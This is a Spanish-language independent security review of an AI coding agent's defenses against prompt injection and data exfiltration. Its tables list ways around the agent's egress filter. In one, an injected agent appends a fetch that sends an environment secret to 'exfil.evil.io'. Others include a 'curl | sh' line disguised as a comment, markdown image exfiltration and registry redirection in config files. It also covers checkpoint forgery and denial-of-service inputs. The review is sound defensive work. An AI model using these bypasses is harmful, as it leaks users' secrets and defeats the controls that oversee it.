# Revisión independiente nº 2 — defensa contra inyección y fuga

Revisor: independiente (no escribió el código). Alcance: commits `f4734d7..HEAD` (`ba59e73~19..HEAD`). Solo lectura; experimentos en directorios temporales fuera del repositorio con `FORGE_HOME` propio.
Principio rector aplicado: un archivo del proyecto es no confiable; las decisiones de seguridad salen del entorno y de las claves del usuario.

**Veredicto: APROBADA_CON_OBSERVACIONES.** El sellado resiste la forja y la reutilización entre hilos o proyectos, que es lo que se pretendía. Hay una regresión de principio en el control de salida (los «hosts conocidos» los decide el repositorio) y varias evasiones triviales de la lista de vías de red. Esas evasiones y los hallazgos S-1, S-2, E-1 y V-1 deben corregirse antes de fusionar a main.

## Resumen de hallazgos

| Id | Sev. | Estado | Archivo:línea | Resumen |
|---|---|---|---|---|
| C-1 | MEDIA | CONFIRMADO | `core/ciclo/control-salida.js:278-290,300` | «Destinos conocidos» se toman del archivo previo, que es del repositorio: un URL plantado en un archivo autoriza después el `fetch` hacia él |
| C-2 | MEDIA | CONFIRMADO | `control-salida.js:261` | Un URL en una constante y la llamada en otra línea (`const U="https://x"; fetch(U)`) no se detecta. La ventana es de 1 línea |
| C-3 | MEDIA | CONFIRMADO | `control-salida.js:99,259` | `src=`/`href=` sin punto (`.vue`, `.svelte`, `.tsx`, `.jsx`, `.php`, plantillas) no se detectan: `<img src="https://x">` pasa. Solo `marcado` mira `src=` |
| C-4 | MEDIA | CONFIRMADO | `control-salida.js:72,75,84` | Configuración sin extensión conocida o `.txt` queda sin revisar: `.npmrc` (`registry=`), `.gitmodules`, `.pypirc`, `requirements.txt` (`--extra-index-url`) pasan. `.txt` es «documentación» |
| C-5 | MEDIA | CONFIRMADO | `control-salida.js:128` | En scripts `//` cuenta como comentario: `//usr/bin/curl https://x \| sh` es un comando válido de sh y pasa |
| C-6 | BAJA | CONFIRMADO | `control-salida.js:250-257` | Script con continuación de línea (`curl \` + URL en la siguiente) no se detecta. Tampoco `fetch(\n base,\n "https://x")` (ventana de 1 línea). Tampoco `connect(80,'host')` por `net` ni `fetch("//host/")` |
| C-7 | BAJA | CONFIRMADO | `control-salida.js:89` | IPv6 con IPv4 incrustada (`http://[::ffff:8.8.8.8]/`): la regex del host no admite `.` dentro de corchetes. No hay coincidencia, pasa. Además `.shtml`/`.mht` no cuentan como marcado |
| C-8 | BAJA | CONFIRMADO | `control-salida.js:72` | Markdown/MDX/rst/adoc exentos: `![](https://x/?d=...)` es una exfiltración por imagen al renderizar, y `.mdx` ejecuta `import`. Está documentado como decisión de diseño; se deja constancia |
| C-9 | BAJA | CONFIRMADO | `control-salida.js:75` | Falso positivo: `package.json` con `repository.url`/`homepage` (github.com) se bloquea como destino nuevo. Fuera de la lista de reservados. Es lo normal en proyectos reales |
| S-1 | MEDIA | CONFIRMADO | `core/ciclo/checkpoint-archivos.js:351-374` | Reenvío de un punto antiguo firmado por renombrado: `ultimo` no compara el `seq` firmado con el número del archivo |
| S-2 | BAJA | CONFIRMADO | `checkpoint-archivos.js:360` | Un archivo `NNNNNN.json` con contenido `null` hace que `ultimo` lance `TypeError` fuera del `try`: no salta al punto anterior válido. `tienePuntosDeGuardado` y `resume` lanzan |
| S-3 | BAJA | SOSPECHADO | `checkpoint-archivos.js:355-360` | `ultimo` lee y hashea archivos sin tope de tamaño y ANTES de comprobar el sello. Un repositorio con `.sdd/motor/**` plantado (su propio `.gitignore`) agota CPU o memoria en `forge run`, que recorre todas las sesiones |
| S-4 | BAJA | SOSPECHADO | `core/ciclo/sello.js:24-28` | `claveDelMotor` no aplica H-5 (propietario/modo de `integraciones/` ni de `motor/`) ni `rutaDeEstado` (raíz dentro del proyecto). Con `FORGE_HOME` relativo o dentro del proyecto, el repositorio planta `motor/clave` y fabrica todo. En un `FORGE_HOME` compartido en POSIX, otro usuario planta la clave |
| S-5 | BAJA | CONFIRMADO | `sello.js:26`, `estado-usuario.js` | Leer (`forge status`, `tienePuntos…`) CREA la clave `motor/clave` si falta, sin aviso: contradice «abrir un repositorio ajeno no deja rastro». La pérdida de la clave invalida todo en silencio (la tarea empieza de cero) |
| E-1 | MEDIA | CONFIRMADO (simulado) | `core/evidencia/cadena.js:439,490` | Carrera entre dos `--registrar`: ambos leen la misma cabeza y la cadena queda `bifurcada` para siempre. Un registro posterior no la repara |
| E-2 | MEDIA | CONFIRMADO | `cadena.js:201,316,405` | Un informe en `.sdd/verificaciones` con anidado profundo (3000 niveles, <2 MB) hace que `canonico` desborde la pila y `comprobarEvidencia` lance `RangeError`, sin capturar. DoS de `--comprobar-evidencia` por un repositorio hostil |
| E-3 | MEDIA | SOSPECHADO | `cadena.js:316,405` | Si el equipo no tiene estado/clave para ese proyecto (clon nuevo), una cadena encadenada sin firma da `ok:true` (nivel `encadenada_sin_firma`, solo un aviso) y `--comprobar-evidencia` sale con 0. Un repositorio ajeno aporta una «evidencia» consistente. La spec lo documenta, pero el código de salida no lo distingue |
| D-1 | BAJA | SOSPECHADO | `core/ciclo/diario.js:44-56,120,196` | `diario/*.jsonl`, `intenciones`, `gasto.jsonl` sin sello. Se evalúan en la sección 4 |
| H-1 | — | sin hallazgo | `core/llm-providers/index.js:96-160` | H-4 resiste los casos probados por lectura (ver sección 5) |
| A-1 | BAJA | SOSPECHADO | `core/api/servidor.js:256-271` | `iteracionesExtra` solo tiene el techo de 1000 por llamada y ninguno por sesión: los techos nuevos cubren solo `presupuestoExtra` |

## 1. Sellado del estado

Cobertura comprobada: sesión (`runId`, `modo`, `creada` y cualquier campo extra, que entra en el sello), punto (`hilo`, `seq`, `nodo`, `siguiente`, `sha256`), `tope.json` (`tope|runId|valor`, con la clave por proyecto). Fuera del sello solo queda `ts`, sin efecto de comportamiento.

| Caso probado | Resultado | Evidencia |
|---|---|---|
| `sesion.json` con campo extra añadido sin resellar | rechazado (`sesionActual` devuelve `null`) | ejecutado |
| Sello de otro hilo (mezcla de hilos) | rechazado: `hilo` va en el sello | leído |
| Copiar un punto a otro número de archivo | **ACEPTADO** (S-1) | ejecutado |
| Borrar los puntos recientes (rollback) | aceptado el anterior. Requiere escritura local. `.sdd/motor/` va en `.gitignore` por defecto, así que un `git pull` normal no lo hace, pero un repositorio hostil trae su propio `.gitignore` | ejecutado |
| Clave ausente | `sesionActual`=null, `tienePuntos…`=false, `resumen` vacío. La guarda del modo clásico sigue cerrada porque `tareasSinTerminarEnElProyecto` cuenta carpetas de hilo («punto(s) dañado(s)») | ejecutado |
| Clave dañada | lecturas devuelven «no válido»; `nuevaSesion`/`guardar` lanzan (cierra) | ejecutado |
| Dos valores con la misma representación en `canonico` | sin colisión alcanzable con JSON: `undefined` se filtra o produce `[]`/`[,]`, que no sale de `JSON.parse`. `NaN`/`-0` no aparecen en lo sellado | leído |
| Carrera al crear la clave | correcta: `linkSync` atómico | leído |
| El repositorio influye en `raizDeEstado()` | no por entorno ni por archivo (no hay dotenv). Sí por `FORGE_HOME` relativo o dentro del proyecto, que ahí no se valida (S-4) | leído |

### S-1 — reenvío de un punto antiguo (MEDIA, CONFIRMADO)
Escenario: se guardan dos puntos (`iteracion` 0 y 3). Se copia `000001.json` a `000009.json`. `ultimo` devuelve `seq 1, iteracion 0`: el sello cubre `seq:1` pero el nombre del archivo es `000009`. Reabre iteraciones y puntos ya consumidos (y con `tope` y gasto tomados del libro). Un repositorio hostil lo logra si el usuario tiene el árbol de trabajo con puntos propios y el repositorio puede escribir en él (p. ej. `git pull` con un `.gitignore` que no ignora `.sdd/motor`).
Corrección: en `ultimo`, exigir `Number(archivo.slice(0,6)) === punto.seq`. Mejor aún, firmar y guardar en el estado del usuario el último `seq` por hilo, y rechazar un `seq` menor.

### S-2 / S-3 — robustez de `ultimo` (BAJA)
Escenario S-2: `echo null > .sdd/motor/<run>/checkpoints/<hilo>/000099.json` → `ultimo` lanza `Cannot read properties of null (reading 'estado')`. No salta al punto válido anterior; `forge resume` falla. Es un DoS que un archivo plantado basta para provocar.
Corrección: validar `punto` como objeto dentro del `try`, comprobar `stat.size` (tope, p. ej. 8 MiB) y verificar el sello antes de hashear el estado.

### S-4 / S-5 — la clave y su carpeta (BAJA)
Corrección: en `claveDelMotor` usar `comprobarPropietarioDelEstado` sobre `integraciones/` y `motor/`, rechazar la raíz si cae bajo el `cwd` (como hace `rutaDeEstado`), y comprobar propietario/modo del archivo `clave`. Para lecturas, no crear la clave (usar el equivalente de `existeEstado`).

## 2. Archivos de `.sdd/motor/**` que se leen sin sello

| Archivo | Quién lo lee | Qué lograría un repositorio hostil | Valoración |
|---|---|---|---|
| `diario/<hilo>.jsonl` | `Diario.obtener` (también los resultados de herramienta del implementador por turnos) | Hacer pasar una respuesta de modelo fabricada como «ya pagada». Necesita conocer `runId` (`run-<AAAAMMDDHHMMSS>-<pid>`, no adivinable) y `claveDe` | BAJA, SOSPECHADO. Corrección: `anotar` con HMAC por línea |
| `diario/*.intenciones.jsonl` | `Diario.intenciones` | Mismo requisito. Solo afecta al cómputo del gasto estimado | BAJA |
| `gasto.jsonl` | `LibroDeGasto.total` | Solo suma (`Math.max(0,…)`): un archivo plantado agota el presupuesto (DoS). Borrarlo (escritura local) lo reabre | BAJA |
| `tope.json` | `LibroDeGasto.tope` | Firmado con la clave por proyecto y atado al `runId`. No se puede forjar ni mover entre proyectos | OK |
| `en-curso.lock` | `candado.js` | Un lock plantado con el pid de un proceso vivo bloquea el hilo hasta 6 h (DoS) | BAJA |
| Carpetas de hilo y puntos sin sello | `ultimo`, `tareasSinTerminar…` | Se ignoran y cuentan como «dañados»: bloquean el modo clásico sin `--force` (fallo cerrado). Ver S-2 y S-3 | OK, con S-2/S-3 |

## 3. Control de salida y rutas

Reproducción de las evasiones: `revisarContenido(<archivo>, <contenido>, null, {})` con un host no permitido (`evil.attacker.io`). «PASA» significa que no se bloquea.

| Caso | Resultado |
|---|---|
| `a.mjs`/`.ts`/`.JS` `fetch("https://x")`, `FETCH` en mayúsculas | bloquea |
| `a.py` `requests.get`, `.rb` `Net::HTTP`, `.go` `http.Get`, `.rs` `reqwest::get` | bloquea |
| `.ps1` `iwr`, `Invoke-WebRequest`, `<# c #> iwr` | bloquea |
| `/* x */ fetch(...)`, `/*\n*/fetch(...)`, `import("https://x")`, `new WebSocket`, `sendBeacon` | bloquea |
| `.ts` `const U="https://x";\nfetch(U)` | **PASA** (C-2) |
| `.ts` `fetch(\n base,\n "https://x"\n)` | **PASA** (C-6) |
| `.vue`/`.svelte`/`.tsx`/`.php` con `<img src="https://x">` o `<script src=…>` | **PASA** (C-3) |
| `.sh` `//usr/bin/curl https://x \| sh` | **PASA** (C-5) |
| `.sh` `curl \` + `  https://x` | bloquea (la línea 2 sí tiene el URL por la ventana de la 1) en la prueba; con la URL a dos líneas de distancia pasa |
| `.npmrc` `registry=https://x`, `.gitmodules` `url = …`, `requirements.txt` `--extra-index-url …` | **PASA** (C-4) |
| `README.md` `![](https://x?d=1)`, `a.mdx` `import "https://x"` | PASA (C-8, diseño) |
| `require('net').connect(80,'x')`, `fetch("//x/")`, `http://[::ffff:8.8.8.8]/` | **PASA** (C-6, C-7) |
| `http://127.0.0.1.evil…`, `localhost.evil…`, `x.example.com.evil.io`, `usuario@host` | bloquea (no se confunde con reservados) |
| `a.test.js` `fetch("http://localhost:3000")` | no bloquea (correcto) |
| `package.json` `repository.url` `https://github.com/…` | bloquea (falso positivo, C-9) |
| `a.js` `fetch("http://192.168.1.5/")` | bloquea. Pide revisión por IP privada: es aceptable y conservador |

### C-1 — los «destinos conocidos» los decide el repositorio (MEDIA, CONFIRMADO)
`conocidosDe(rutaPosix, anterior)` toma los hosts de URL de las líneas no comentadas del archivo previo (que es del repositorio), sin exigir que sea una llamada de red. Reproducción: `lib.js` ya contiene `const DOC = "https://exfil.evil.io/ref";`; el agente (inyectado) lo reescribe añadiendo `fetch(DOC+"?d="+process.env.K)` → `{ ok: true }`. Rompe el principio rector.
Corrección: «conocido» solo cuando el URL aparece en una línea que también es llamada de red en el archivo previo Y el archivo está en el commit `HEAD` limpio. Mejor: no usar «conocidos» y exigir política del usuario (`FRAGUA_DESTINOS_PERMITIDOS`) o revisión humana por cada host nuevo del cambio.

### C-2 a C-7 — evasiones de la lista
Corrección propuesta, en este orden de impacto:
1. En `codigo`/`marcado`, tratar toda URL con esquema en una línea no comentada como destino salvo reservados, sin exigir llamada en la misma línea ni en la anterior (la lista de llamadas deja de ser puerta; la cifra del 62 % que cita el spike se refiere a documentación y esa ya está exenta).
2. `src|href|action|srcset|poster|data` sin punto en `codigo` de plantillas (`.vue`, `.svelte`, `.jsx`, `.tsx`, `.php`, `.erb`, `.ejs`, `.hbs`, `.njk`, `.astro`, `.shtml`, `.mht`), usando `hostsDeCarga`.
3. Reconocer por nombre como `configuracion`: `.npmrc`, `.yarnrc*`, `.pypirc`, `.gitmodules`, `.gitconfig`, `pip.conf`, `Pipfile`, `.condarc`, `go.mod`, `*.gradle`/`*.kts` y `requirements*.txt`/`constraints*.txt`. `.txt` no debe ser «documentación» cuando el nombre es de dependencias.
4. En scripts, quitar `//` de los marcadores de comentario (no lo es en sh/bat/ps1) y unir continuaciones `\`/`` ` ``/`^` antes de analizar.
5. Aceptar `.` dentro de corchetes IPv6 en `RE_URL`. Para C-9, un `package.json` solo con URL en `repository`/`homepage`/`bugs` hacia hosts de forja conocidos (`github.com`, `gitlab.com`) no debería requerir revisión, pero esa lista tendría que venir de código y no del repositorio.

### Falsos positivos graves
Solo C-9 (`package.json`) y las IP privadas. READMEs con ejemplos y pruebas con `localhost` no se bloquean.

## 4. Evidencia encadenada

| Pregunta | Respuesta |
|---|---|
| ¿Puede el repositorio aportar su clave o su cabeza? | No: ambas viven en el estado del usuario por proyecto y `rutaDeEstado` rechaza raíces dentro del proyecto. La cabeza va firmada |
| Rollback de la cabeza | Requiere escribir en el estado del usuario (fuera de alcance del repositorio). Borrar informes recientes se detecta (`truncada`) si la cabeza existe |
| Campos enormes | acotados: `texto()` a 512, informe a 2 MiB, 5000 informes. Pero ver E-2 |
| `__proto__` en JSON de entrada | sin efecto: `JSON.parse` crea clave propia y `canonico` usa `Object.keys` |
| Rutas con `..` | `id` solo se compara con el nombre del archivo y se muestra truncado y sin control. No se usa para rutas |
| Carrera entre dos `--registrar` | E-1 |
| Chain sin firma en equipo sin clave | E-3 |

### E-1 (MEDIA, CONFIRMADO simulado)
`construirInforme` ×2 antes de crear → ambos `anterior` iguales → `comprobarEvidencia` da `bifurcada`; un tercer `--registrar` no la repara (los dos primeros siguen siendo raíces o hermanos). La reproducción fue secuencial (la ventana es real: no hay candado entre `recorrer` y `crear`, ni sobre la cabeza).
Corrección: candado de archivo (`candado.js`) alrededor de leer la cabeza, crear el informe y guardar la cabeza. Reintentar la lectura tras obtener el candado.

### E-2 (MEDIA, CONFIRMADO)
Un `.sdd/verificaciones/x.json` de 6 KB con 3000 `[` anidados (con `evidencia.sha256` bien formado) → `RangeError: Maximum call stack size exceeded` desde `hashDeInforme`, sin `try` en `recorrer`. Bloquea `--comprobar-evidencia` y, vía `construirInforme`, `--registrar` (lo captura `registrarVerificacion` y devuelve `ok:false`).
Corrección: capturar en el bucle de `recorrer` (informe «alterado/ilegible») y limitar la profundidad al leer.

### E-3 (SOSPECHADO)
En un clon nuevo sin estado de usuario la cadena sin firmar es `ok:true`. Corrección: `--comprobar-evidencia` debe salir distinto de 0 cuando `nivel !== 'firmada'` salvo con una opción explícita (`--permitir-sin-firma`), o al menos usar un código de salida propio.

## 5. Endurecimientos

| Punto | Resultado |
|---|---|
| `llm-providers` H-4 (`sanearConfigDelProyecto`) | Sin bypass hallado. `base_url` loopback con proveedor con clave se elimina; `OPENAI_BASE_URL`/`OLLAMA_BASE_URL` del entorno mandan; `deepseek`/`llama` usan `OllamaProvider` (no envían clave) y por eso quedan exentos de la comprobación de loopback, lo cual es coherente. `127.1`, `0x7f.1` se normalizan a `127.0.0.1`; `[::ffff:127.0.0.1]` y `0.0.0.0` no son loopback y se rechazan. `localhost.` (punto final) tampoco. `http:` solo a loopback, `https:` fuera de loopback solo con `FORGE_LLM_HOSTS`. Un conflicto entre `FRAGUA_LLM_PROVIDER` y `FORGE_LLM_PROVIDER` lanza en `proveedorSinClave` (cierra) |
| `servidor.js` techos de `presupuestoExtra` | Correcto: techo por llamada y por sesión del entorno de quien arranca la API, valor no numérico/negativo vuelve al defecto, `NaN`/infinito rechazado por `Number.isFinite`, comprobación y suma síncronas (sin carrera). Observación A-1: `iteracionesExtra` sin techo por sesión; la suma solo ocurre si `iniciar` devuelve (no se devuelve en caso de fallo posterior, lado conservador) |
| `estado-usuario.js` propietario (H-5) | Aplicado a la carpeta por proyecto (`directorioDeEstado`). No a `integraciones/`, `motor/` ni al archivo `clave` (S-4). En Windows solo comprueba enlace/carpeta (límite documentado) |

## Lo que debe corregirse antes de fusionar a main

1. C-1: quitar a `anterior` (repositorio) como fuente de «destinos conocidos».
2. C-2, C-3, C-4, C-5: las evasiones triviales del control de salida (URL en constante, `src=` en plantillas, `.npmrc`/`requirements.txt`/`.gitmodules`, `//` en scripts).
3. S-1: comparar el `seq` firmado con el nombre del archivo; S-2: `ultimo` no debe lanzar con un archivo `null`.
4. E-1: candado alrededor de registrar la cadena; E-2: capturar el desbordamiento de pila en `recorrer`.
5. Recomendable (no bloqueante): S-3/S-4/S-5 (tope de tamaño y orden de comprobación en `ultimo`; propietario y raíz de la clave de `motor`; no crear la clave al leer), E-3, A-1, C-6 a C-9, y sellar por línea el diario de respuestas.
